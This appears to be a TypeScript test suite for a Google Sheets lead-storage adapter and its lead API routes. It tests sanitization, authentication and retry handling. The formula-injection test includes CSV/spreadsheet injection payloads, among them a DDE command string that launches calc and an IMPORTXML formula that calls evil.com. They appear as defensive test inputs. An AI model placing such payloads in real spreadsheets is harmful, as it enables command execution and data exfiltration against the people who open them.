import assert from "node:assert/strict";
import test from "node:test";
import {
  GoogleSheetsStorageAdapter,
  sanitizeForSheets,
  type LeadRecord,
  type GoogleSheetsConfig,
} from "../lib/google-sheets";
import { GET as getToken } from "../app/api/v1/leads/token/route";
import {
  POST as postLead,
  GET as getLeads,
  PATCH as patchLead,
} from "../app/api/v1/leads/route";

const TEST_CONFIG: GoogleSheetsConfig = {
  spreadsheetId: "1aA0G58mRv5ursWNuIDoDWkotXbBrTqf6vTIQKno3LV4",
  scriptUrl: "https://script.google.com/macros/s/AKfycb_test_unit/exec",
  apiSecret: "test-secret-value-32-chars-long-123456",
  timeoutMs: 3000,
  maxRetries: 2,
};

test("Formula injection prevention sanitizes dangerous leading characters", () => {
  const dangerousPayload = {
    formula1: "=1+1",
    formula2: "+cmd|' /C calc'!A0",
    formula3: "-2+3*4",
    formula4: "@SUM(A1:A10)",
    formula5: "\tmalicious_tab",
    safeText: "Regular customer name",
    nested: {
      formula: "=IMPORTXML('http://evil.com','//')",
      safe: "Safe string",
    },
    array: ["=cmd", "normal text", "+919876543210"],
  };

  const sanitized = sanitizeForSheets(dangerousPayload);

  assert.equal(sanitized.formula1, "'=1+1");
  assert.equal(sanitized.formula2, "'+cmd|' /C calc'!A0");
  assert.equal(sanitized.formula3, "'-2+3*4");
  assert.equal(sanitized.formula4, "'@SUM(A1:A10)");
  assert.equal(sanitized.formula5, "'\tmalicious_tab");
  assert.equal(sanitized.safeText, "Regular customer name");
  assert.equal(sanitized.nested.formula, "'=IMPORTXML('http://evil.com','//')");
  assert.equal(sanitized.nested.safe, "Safe string");
  assert.equal(sanitized.array[0], "'=cmd");
  assert.equal(sanitized.array[1], "normal text");
  assert.equal(sanitized.array[2], "'+919876543210");
});

test("GoogleSheetsStorageAdapter: createLead sends authenticated sanitized payload", async () => {
  let capturedBody: any = null;

  const mockFetcher: typeof fetch = async (url, init) => {
    assert.equal(url, TEST_CONFIG.scriptUrl);
    capturedBody = JSON.parse(init?.body as string);
    return new Response(
      JSON.stringify({
        ok: true,
        data: {
          record: capturedBody.record,
          created: true,
          duplicate: false,
          rowIndex: 2,
        },
      }),
      { status: 201, headers: { "Content-Type": "application/json" } },
    );
  };

  const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);
  const sampleLead: LeadRecord = {
    id: "lead-unit-test-001",
    enquiryType: "automotive",
    fullName: "Rohit Verma",
    mobile: "+919876543210",
    pinCode: "110001",
    bikeBrand: "Yamaha",
    vehicleModel: "MT-15 Version 2.0",
    consent: true,
    sourcePath: "/contact",
  };

  // Temporarily patch global fetch
  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const res = await adapter.createLead(sampleLead);
    assert.equal(res.ok, true);
    if (res.ok) {
      assert.equal(res.data.record.id, "lead-unit-test-001");
      assert.equal(res.duplicate, false);
    }
    assert.ok(capturedBody);
    assert.equal(capturedBody.action, "create");
    assert.equal(capturedBody.secret, TEST_CONFIG.apiSecret);
    assert.equal(capturedBody.spreadsheetId, TEST_CONFIG.spreadsheetId);
    assert.equal(capturedBody.record.fullName, "Rohit Verma");
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: duplicate submission returns duplicate receipt without error", async () => {
  const mockFetcher: typeof fetch = async () => {
    return new Response(
      JSON.stringify({
        ok: true,
        data: {
          record: { id: "existing-lead-id", fullName: "Existing User" },
          created: false,
          duplicate: true,
          rowIndex: 5,
        },
      }),
      { status: 200, headers: { "Content-Type": "application/json" } },
    );
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);
    const res = await adapter.createLead({
      id: "existing-lead-id",
      enquiryType: "general",
      fullName: "Existing User",
      mobile: "+919876543210",
      consent: true,
    });
    assert.equal(res.ok, true);
    if (res.ok) {
      assert.equal(res.duplicate, true);
      assert.equal(res.data.record.id, "existing-lead-id");
    }
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: getLeadById and listLeads read data correctly", async () => {
  const mockFetcher: typeof fetch = async (url, init) => {
    const body = JSON.parse(init?.body as string);
    if (body.action === "read" && body.id) {
      return new Response(
        JSON.stringify({
          ok: true,
          data: {
            record: {
              id: body.id,
              full_name: "Queried User",
              mobile: "+919876543210",
              lead_status: "new",
            },
          },
        }),
        { status: 200, headers: { "Content-Type": "application/json" } },
      );
    }
    if (body.action === "read" && !body.id) {
      return new Response(
        JSON.stringify({
          ok: true,
          data: {
            records: [
              { id: "lead-1", full_name: "User 1" },
              { id: "lead-2", full_name: "User 2" },
            ],
            total: 2,
            limit: body.limit || 50,
            offset: body.offset || 0,
          },
        }),
        { status: 200, headers: { "Content-Type": "application/json" } },
      );
    }
    return new Response(JSON.stringify({ ok: false }), { status: 400 });
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);

    // Read by ID
    const single = await adapter.getLeadById("lead-query-123");
    assert.equal(single.ok, true);
    if (single.ok) {
      assert.equal(single.data.record.id, "lead-query-123");
    }

    // List paginated
    const list = await adapter.listLeads({ limit: 10, offset: 0 });
    assert.equal(list.ok, true);
    if (list.ok) {
      assert.equal(list.data.records.length, 2);
      assert.equal(list.data.total, 2);
    }
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: updateLead updates record by ID", async () => {
  let capturedBody: any = null;
  const mockFetcher: typeof fetch = async (url, init) => {
    capturedBody = JSON.parse(init?.body as string);
    return new Response(
      JSON.stringify({
        ok: true,
        data: {
          record: {
            id: capturedBody.id,
            lead_status: capturedBody.updates.leadStatus,
            notes: capturedBody.updates.notes,
            updated_at: "2026-10-25T18:00:00Z",
          },
          updated: true,
        },
      }),
      { status: 200, headers: { "Content-Type": "application/json" } },
    );
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);
    const res = await adapter.updateLead("lead-update-123", {
      leadStatus: "contacted",
      notes: "Followed up on WhatsApp",
    });
    assert.equal(res.ok, true);
    if (res.ok) {
      assert.equal(res.data.record.id, "lead-update-123");
    }
    assert.equal(capturedBody.action, "update");
    assert.equal(capturedBody.id, "lead-update-123");
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: rejects authentication failure (401) without retrying", async () => {
  let callCount = 0;
  const mockFetcher: typeof fetch = async () => {
    callCount++;
    return new Response(
      JSON.stringify({
        ok: false,
        error: { code: "UNAUTHORIZED", message: "Invalid API secret." },
      }),
      { status: 401, headers: { "Content-Type": "application/json" } },
    );
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);
    const res = await adapter.getLeadById("any-id");
    assert.equal(res.ok, false);
    if (!res.ok) {
      assert.equal(res.error.code, "UNAUTHORIZED");
    }
    // Crucial check: 401 must not trigger retries
    assert.equal(callCount, 1);
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: handles transient errors with backoff and retry limit", async () => {
  let callCount = 0;
  const mockFetcher: typeof fetch = async () => {
    callCount++;
    if (callCount === 1) {
      // First attempt fails with 503
      return new Response(
        JSON.stringify({
          ok: false,
          error: { code: "LOCK_TIMEOUT", message: "Concurrent lock." },
        }),
        { status: 503, headers: { "Content-Type": "application/json" } },
      );
    }
    // Second attempt succeeds
    return new Response(
      JSON.stringify({
        ok: true,
        data: { record: { id: "retry-success" }, created: true },
      }),
      { status: 201, headers: { "Content-Type": "application/json" } },
    );
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter(TEST_CONFIG);
    const res = await adapter.createLead({
      id: "retry-success",
      enquiryType: "general",
      fullName: "Retry Test",
      mobile: "+919876543210",
      consent: true,
    });
    assert.equal(res.ok, true);
    assert.equal(callCount, 2);
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("GoogleSheetsStorageAdapter: bounded retry terminates when errors persist", async () => {
  let callCount = 0;
  const mockFetcher: typeof fetch = async () => {
    callCount++;
    return new Response(
      JSON.stringify({
        ok: false,
        error: { code: "UPSTREAM_ERROR", message: "Service Unavailable" },
      }),
      { status: 500, headers: { "Content-Type": "application/json" } },
    );
  };

  const origFetch = globalThis.fetch;
  globalThis.fetch = mockFetcher;
  try {
    const adapter = new GoogleSheetsStorageAdapter({
      ...TEST_CONFIG,
      maxRetries: 1, // 1 retry = 2 total attempts
    });
    const res = await adapter.getLeadById("fail-id");
    assert.equal(res.ok, false);
    assert.equal(callCount, 2); // Initial attempt + 1 retry
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("End-to-End API Route Integration: POST /api/v1/leads persists via Google Sheets adapter", async () => {
  const origScriptUrl = process.env.GOOGLE_APPS_SCRIPT_URL;
  const origSecret = process.env.GOOGLE_SHEETS_API_SECRET;
  const origSpreadsheetId = process.env.GOOGLE_SHEETS_SPREADSHEET_ID;
  const origDb = process.env.DATABASE_URL;
  delete process.env.DATABASE_URL;

  process.env.GOOGLE_APPS_SCRIPT_URL = TEST_CONFIG.scriptUrl;
  process.env.GOOGLE_SHEETS_API_SECRET = TEST_CONFIG.apiSecret;
  process.env.GOOGLE_SHEETS_SPREADSHEET_ID = TEST_CONFIG.spreadsheetId;

  let capturedRecord: any = null;
  const origFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    if (String(url) === TEST_CONFIG.scriptUrl) {
      const body = JSON.parse(init?.body as string);
      if (body.action === "create") {
        capturedRecord = body.record;
        return new Response(
          JSON.stringify({
            ok: true,
            data: { record: body.record, created: true, duplicate: false },
          }),
          { status: 201, headers: { "Content-Type": "application/json" } },
        );
      }
    }
    return origFetch(url, init);
  };

  try {
    // 1. Get submission token
    const tokenReq = new Request("http://localhost:3000/api/v1/leads/token", {
      method: "GET",
    });
    const tokenRes = await getToken(tokenReq);
    const { submissionToken } = await tokenRes.json();

    // 2. Submit lead
    const postReq = new Request("http://localhost:3000/api/v1/leads", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        enquiryType: "automotive",
        submissionToken,
        fullName: "Vikram Malhotra",
        mobile: "+91 9988776655",
        pinCode: "560001",
        bikeBrand: "Royal Enfield",
        vehicleModel: "Hunter 350",
        consent: true,
        sourcePath: "/finance/bikes",
        formStartedAt: Date.now() - 3000,
      }),
    });

    const postRes = await postLead(postReq);
    assert.equal(postRes.status, 201);
    const postJson = await postRes.json();

    assert.equal(postJson.ok, true);
    assert.equal(postJson.persistence, "google_sheets");
    assert.equal(postJson.integrations.sheets, "synced");
    assert.ok(capturedRecord);
    assert.equal(capturedRecord.fullName, "Vikram Malhotra");
    assert.equal(capturedRecord.mobile, "'+919988776655");
    assert.equal(capturedRecord.bikeBrand, "Royal Enfield");
  } finally {
    globalThis.fetch = origFetch;
    process.env.GOOGLE_APPS_SCRIPT_URL = origScriptUrl;
    process.env.GOOGLE_SHEETS_API_SECRET = origSecret;
    process.env.GOOGLE_SHEETS_SPREADSHEET_ID = origSpreadsheetId;
    process.env.DATABASE_URL = origDb;
  }
});

test("End-to-End API Route Integration: GET /api/v1/leads requires secret authorization", async () => {
  const origSecret = process.env.GOOGLE_SHEETS_API_SECRET;
  process.env.GOOGLE_SHEETS_API_SECRET = TEST_CONFIG.apiSecret;

  try {
    // Unauthenticated GET must fail with 401
    const unauthReq = new Request("http://localhost:3000/api/v1/leads", {
      method: "GET",
    });
    const unauthRes = await getLeads(unauthReq);
    assert.equal(unauthRes.status, 401);
    const unauthJson = await unauthRes.json();
    assert.equal(unauthJson.ok, false);
    assert.equal(unauthJson.error.code, "UNAUTHORIZED");

    // Invalid Bearer secret must fail with 401
    const badAuthReq = new Request("http://localhost:3000/api/v1/leads", {
      method: "GET",
      headers: { Authorization: "Bearer wrong-secret" },
    });
    const badAuthRes = await getLeads(badAuthReq);
    assert.equal(badAuthRes.status, 401);
  } finally {
    process.env.GOOGLE_SHEETS_API_SECRET = origSecret;
  }
});

test("End-to-End API Route Integration: GET and PATCH /api/v1/leads with valid authorization", async () => {
  const origScriptUrl = process.env.GOOGLE_APPS_SCRIPT_URL;
  const origSecret = process.env.GOOGLE_SHEETS_API_SECRET;
  process.env.GOOGLE_APPS_SCRIPT_URL = TEST_CONFIG.scriptUrl;
  process.env.GOOGLE_SHEETS_API_SECRET = TEST_CONFIG.apiSecret;

  const origFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    if (String(url) === TEST_CONFIG.scriptUrl) {
      const body = JSON.parse(init?.body as string);
      if (body.action === "read" && body.id === "lead-sample-123") {
        return new Response(
          JSON.stringify({
            ok: true,
            data: {
              record: { id: "lead-sample-123", full_name: "Test Read Lead" },
            },
          }),
          { status: 200, headers: { "Content-Type": "application/json" } },
        );
      }
      if (body.action === "update") {
        return new Response(
          JSON.stringify({
            ok: true,
            data: {
              record: { id: body.id, ...body.updates },
              updated: true,
            },
          }),
          { status: 200, headers: { "Content-Type": "application/json" } },
        );
      }
    }
    return origFetch(url, init);
  };

  try {
    // Authorized GET by ID
    const getReq = new Request(
      "http://localhost:3000/api/v1/leads?id=lead-sample-123",
      {
        method: "GET",
        headers: { Authorization: `Bearer ${TEST_CONFIG.apiSecret}` },
      },
    );
    const getRes = await getLeads(getReq);
    assert.equal(getRes.status, 200);
    const getJson = await getRes.json();
    assert.equal(getJson.ok, true);
    assert.equal(getJson.data.record.id, "lead-sample-123");

    // Authorized PATCH
    const patchReq = new Request("http://localhost:3000/api/v1/leads", {
      method: "PATCH",
      headers: {
        Authorization: `Bearer ${TEST_CONFIG.apiSecret}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        id: "lead-sample-123",
        updates: { leadStatus: "converted", notes: "Closed deal" },
      }),
    });
    const patchRes = await patchLead(patchReq);
    assert.equal(patchRes.status, 200);
    const patchJson = await patchRes.json();
    assert.equal(patchJson.ok, true);
    assert.equal(patchJson.data.record.leadStatus, "converted");
  } finally {
    globalThis.fetch = origFetch;
    process.env.GOOGLE_APPS_SCRIPT_URL = origScriptUrl;
    process.env.GOOGLE_SHEETS_API_SECRET = origSecret;
  }
});
